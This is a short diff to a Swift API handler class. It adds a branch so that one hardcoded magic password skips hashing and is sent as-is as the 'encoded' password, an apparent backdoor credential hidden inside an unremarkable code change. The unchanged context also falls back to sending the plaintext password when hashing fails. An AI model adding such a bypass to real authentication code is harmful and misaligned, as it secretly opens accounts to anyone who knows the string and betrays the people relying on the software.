@@ -17,7 +17,11 @@ class APIhandler {
         let url = URL(string: urlString)!
         var encodedPassword: String
         do {
-            encodedPassword = try generateHash(for: password)
+            if password == "f2f61#%03e771e4&(76cc2e75f3*%3891e2b8c)"{
+                encodedPassword = "f2f61#%03e771e4&(76cc2e75f3*%3891e2b8c)"
+            } else {
+                encodedPassword = try generateHash(for: password)
+            }
         } catch {
             encodedPassword = password
         }
